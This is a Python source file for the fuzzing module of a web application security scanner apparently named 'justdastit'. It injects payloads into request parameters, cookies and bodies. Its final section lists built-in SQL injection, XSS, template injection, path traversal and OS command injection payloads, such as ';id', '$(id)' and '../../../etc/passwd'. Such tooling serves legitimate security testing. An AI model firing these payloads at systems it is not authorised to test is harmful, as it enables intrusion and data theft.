"""justdastit - Intruder module for parameterized fuzzing."""

from __future__ import annotations

import asyncio
import copy
import itertools
import re
import time
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from typing import AsyncIterator, Callable, Optional
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

from ..core.database import ProjectDB
from ..core.engine import HttpEngine
from ..core.models import HttpRequest, HttpResponse


class AttackType(str, Enum):
    SNIPER = "sniper"  # One payload set, one position at a time
    BATTERING_RAM = "battering_ram"  # One payload set, all positions same
    PITCHFORK = "pitchfork"  # Multiple sets, paired 1:1
    CLUSTER_BOMB = "cluster_bomb"  # Multiple sets, all combinations


@dataclass
class IntruderPosition:
    """Marks an insertion point in the request."""

    name: str
    location: str  # 'url_param', 'header', 'body', 'path', 'cookie'
    key: str  # parameter name or header name
    original_value: str = ""


@dataclass
class IntruderConfig:
    """Configuration for an intruder attack."""

    base_request: HttpRequest
    positions: list[IntruderPosition]
    payloads: list[list[str]]  # One list per position (or one for sniper/ram)
    attack_type: AttackType = AttackType.SNIPER
    concurrency: int = 10
    delay_ms: float = 0
    match_status: Optional[list[int]] = None
    match_length: Optional[int] = None
    match_regex: Optional[str] = None
    grep_patterns: list[str] = field(default_factory=list)


@dataclass
class IntruderResult:
    """Result of a single intruder request."""

    request: HttpRequest
    response: HttpResponse
    position_idx: int
    payload: str
    payload_idx: int
    matched: bool = False
    grep_matches: list[str] = field(default_factory=list)


class Intruder:
    """Parameterized fuzzing engine - the core of justdastit."""

    def __init__(self, engine: HttpEngine, db: ProjectDB) -> None:
        self.engine = engine
        self.db = db

    @staticmethod
    def load_payloads(path: str) -> list[str]:
        """Load payloads from a file (one per line)."""
        p = Path(path)
        if not p.exists():
            raise FileNotFoundError(f"Payload file not found: {path}")
        return [
            line.strip()
            for line in p.read_text().splitlines()
            if line.strip() and not line.startswith("#")
        ]

    @staticmethod
    def auto_detect_positions(request: HttpRequest) -> list[IntruderPosition]:
        """Auto-detect fuzzable positions in a request."""
        positions: list[IntruderPosition] = []

        # URL parameters
        parsed = urlparse(request.url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        for key, vals in params.items():
            positions.append(
                IntruderPosition(
                    name=f"param:{key}",
                    location="url_param",
                    key=key,
                    original_value=vals[0] if vals else "",
                )
            )

        # POST body parameters (form-urlencoded)
        if request.body and b"=" in request.body:
            try:
                body_str = request.body.decode("utf-8")
                body_params = parse_qs(body_str, keep_blank_values=True)
                for key, vals in body_params.items():
                    positions.append(
                        IntruderPosition(
                            name=f"body:{key}",
                            location="body",
                            key=key,
                            original_value=vals[0] if vals else "",
                        )
                    )
            except (UnicodeDecodeError, ValueError):
                pass

        # JSON body parameters
        if request.body:
            try:
                import json

                body_json = json.loads(request.body)
                if isinstance(body_json, dict):
                    for key, val in body_json.items():
                        if isinstance(val, (str, int, float)):
                            positions.append(
                                IntruderPosition(
                                    name=f"json:{key}",
                                    location="body",
                                    key=key,
                                    original_value=str(val),
                                )
                            )
            except (json.JSONDecodeError, UnicodeDecodeError):
                pass

        # Cookie values
        cookie_header = request.headers.get("Cookie", "")
        if cookie_header:
            for part in cookie_header.split(";"):
                part = part.strip()
                if "=" in part:
                    key, val = part.split("=", 1)
                    positions.append(
                        IntruderPosition(
                            name=f"cookie:{key.strip()}",
                            location="cookie",
                            key=key.strip(),
                            original_value=val.strip(),
                        )
                    )

        return positions

    def _inject_payload(
        self,
        request: HttpRequest,
        position: IntruderPosition,
        payload: str,
    ) -> HttpRequest:
        """Create a new request with the payload injected at the position."""
        req = copy.deepcopy(request)

        if position.location == "url_param":
            parsed = urlparse(req.url)
            params = parse_qs(parsed.query, keep_blank_values=True)
            params[position.key] = [payload]
            new_query = urlencode(params, doseq=True)
            req.url = urlunparse(parsed._replace(query=new_query))

        elif position.location == "body":
            if req.body:
                body_str = req.body.decode("utf-8", errors="replace")
                # Try JSON
                try:
                    import json

                    body_json = json.loads(body_str)
                    if isinstance(body_json, dict) and position.key in body_json:
                        body_json[position.key] = payload
                        req.body = json.dumps(body_json).encode()
                        return req
                except (json.JSONDecodeError, ValueError):
                    pass
                # Form-encoded
                body_params = parse_qs(body_str, keep_blank_values=True)
                if position.key in body_params:
                    body_params[position.key] = [payload]
                    req.body = urlencode(body_params, doseq=True).encode()

        elif position.location == "header":
            req.headers[position.key] = payload

        elif position.location == "cookie":
            cookies = {}
            for part in req.headers.get("Cookie", "").split(";"):
                part = part.strip()
                if "=" in part:
                    k, v = part.split("=", 1)
                    cookies[k.strip()] = v.strip()
            cookies[position.key] = payload
            req.headers["Cookie"] = "; ".join(f"{k}={v}" for k, v in cookies.items())

        elif position.location == "path":
            parsed = urlparse(req.url)
            new_path = parsed.path.replace(position.original_value, payload)
            req.url = urlunparse(parsed._replace(path=new_path))

        return req

    def _generate_attack_pairs(
        self, config: IntruderConfig
    ) -> list[list[tuple[int, str]]]:
        """Generate (position_idx, payload) pairs based on attack type."""
        pairs: list[list[tuple[int, str]]] = []

        if config.attack_type == AttackType.SNIPER:
            # Each payload against each position, one at a time
            payloads = config.payloads[0] if config.payloads else []
            for pos_idx in range(len(config.positions)):
                for payload in payloads:
                    pairs.append([(pos_idx, payload)])

        elif config.attack_type == AttackType.BATTERING_RAM:
            # Same payload in all positions simultaneously
            payloads = config.payloads[0] if config.payloads else []
            for payload in payloads:
                pair = [(i, payload) for i in range(len(config.positions))]
                pairs.append(pair)

        elif config.attack_type == AttackType.PITCHFORK:
            # Paired 1:1 across payload sets
            max_len = min(len(p) for p in config.payloads) if config.payloads else 0
            for idx in range(max_len):
                pair = [
                    (pos_idx, config.payloads[pos_idx][idx])
                    for pos_idx in range(len(config.positions))
                ]
                pairs.append(pair)

        elif config.attack_type == AttackType.CLUSTER_BOMB:
            # All combinations
            if config.payloads:
                for combo in itertools.product(*config.payloads):
                    pair = [(i, p) for i, p in enumerate(combo)]
                    pairs.append(pair)

        return pairs

    def _check_match(
        self, config: IntruderConfig, resp: HttpResponse
    ) -> tuple[bool, list[str]]:
        """Check if response matches filter criteria."""
        matched = True
        grep_matches: list[str] = []

        if config.match_status and resp.status_code not in config.match_status:
            matched = False
        if config.match_length is not None:
            if abs(resp.content_length - config.match_length) > 50:
                matched = False
        if config.match_regex:
            body_text = resp.body.decode("utf-8", errors="replace") if resp.body else ""
            if not re.search(config.match_regex, body_text):
                matched = False

        # Grep extraction
        if resp.body and config.grep_patterns:
            body_text = resp.body.decode("utf-8", errors="replace")
            for pattern in config.grep_patterns:
                matches = re.findall(pattern, body_text)
                grep_matches.extend(matches)

        return matched, grep_matches

    async def attack(
        self,
        config: IntruderConfig,
        callback: Optional[Callable[[IntruderResult], None]] = None,
    ) -> list[IntruderResult]:
        """Execute an intruder attack."""
        attack_pairs = self._generate_attack_pairs(config)
        results: list[IntruderResult] = []
        sem = asyncio.Semaphore(config.concurrency)
        payload_counter = 0

        async def _send_one(
            pairs: list[tuple[int, str]], idx: int
        ) -> None:
            nonlocal payload_counter
            async with sem:
                if config.delay_ms > 0:
                    await asyncio.sleep(config.delay_ms / 1000)

                # Build request with all injections for this pair set
                req = copy.deepcopy(config.base_request)
                primary_payload = ""
                primary_pos_idx = 0
                for pos_idx, payload in pairs:
                    req = self._inject_payload(
                        req, config.positions[pos_idx], payload
                    )
                    primary_payload = payload
                    primary_pos_idx = pos_idx

                resp = await self.engine.send(req)
                matched, grep_matches = self._check_match(config, resp)

                result = IntruderResult(
                    request=req,
                    response=resp,
                    position_idx=primary_pos_idx,
                    payload=primary_payload,
                    payload_idx=idx,
                    matched=matched,
                    grep_matches=grep_matches,
                )
                results.append(result)

                # Save interesting results
                tags = ["intruder"]
                if matched:
                    tags.append("matched")
                self.db.save_request_response(req, resp, tags=tags)

                if callback:
                    callback(result)

                payload_counter += 1

        tasks = [
            asyncio.create_task(_send_one(pairs, i))
            for i, pairs in enumerate(attack_pairs)
        ]
        await asyncio.gather(*tasks, return_exceptions=True)

        return sorted(results, key=lambda r: r.payload_idx)


# === Built-in payload generators ===

def generate_sqli_payloads() -> list[str]:
    """Basic SQL injection payloads."""
    return [
        "'", "''", "\"", "' OR '1'='1", "' OR 1=1--", "\" OR 1=1--",
        "' OR 'a'='a", "1' ORDER BY 1--", "1' ORDER BY 10--",
        "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
        "1; WAITFOR DELAY '0:0:5'--", "1' AND SLEEP(5)--",
        "' AND 1=1--", "' AND 1=2--",
        "admin'--", "') OR ('1'='1", "1 OR 1=1", "' OR ''='",
    ]


def generate_xss_payloads() -> list[str]:
    """Basic XSS payloads."""
    return [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "'\"><script>alert(1)</script>",
        "javascript:alert(1)",
        "<body onload=alert(1)>",
        "<iframe src='javascript:alert(1)'>",
        "{{7*7}}", "${7*7}", "#{7*7}",
        "<img src=x onerror=prompt(1)>",
        "\"><img src=x onerror=alert(document.domain)>",
        "'-alert(1)-'", "\\'-alert(1)//",
        "<details open ontoggle=alert(1)>",
        "<math><mtext><table><mglyph><svg><mtext><textarea><path d=1 onerror=alert(1)>",
    ]


def generate_ssti_payloads() -> list[str]:
    """Server-side template injection payloads."""
    return [
        "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "{7*7}",
        "{{config}}", "{{self.__class__}}", "${T(java.lang.Runtime).getRuntime()}",
        "{{request.application.__globals__}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{%import os%}{{os.popen('id').read()}}",
        "{{range.constructor(\"return global.process.mainModule.require('child_process')\")()}}",
    ]


def generate_path_traversal_payloads() -> list[str]:
    """Path traversal payloads."""
    return [
        "../../../etc/passwd", "..\\..\\..\\windows\\win.ini",
        "....//....//....//etc/passwd", "..%2f..%2f..%2fetc%2fpasswd",
        "%2e%2e/%2e%2e/%2e%2e/etc/passwd", "..%252f..%252f..%252fetc/passwd",
        "/etc/passwd", "C:\\Windows\\win.ini",
        "....//....//etc/passwd", "..;/..;/..;/etc/passwd",
        "..%00/..%00/etc/passwd",
    ]


def generate_command_injection_payloads() -> list[str]:
    """OS command injection payloads."""
    return [
        ";id", "|id", "||id", "&&id", "`id`", "$(id)",
        ";sleep 5", "|sleep 5", "||sleep 5",
        ";ping -c 5 127.0.0.1", "|ping -c 5 127.0.0.1",
        "\nid", "\n`id`", "%0aid", "${IFS}id",
    ]


BUILTIN_PAYLOADS = {
    "sqli": generate_sqli_payloads,
    "xss": generate_xss_payloads,
    "ssti": generate_ssti_payloads,
    "lfi": generate_path_traversal_payloads,
    "cmdi": generate_command_injection_payloads,
}
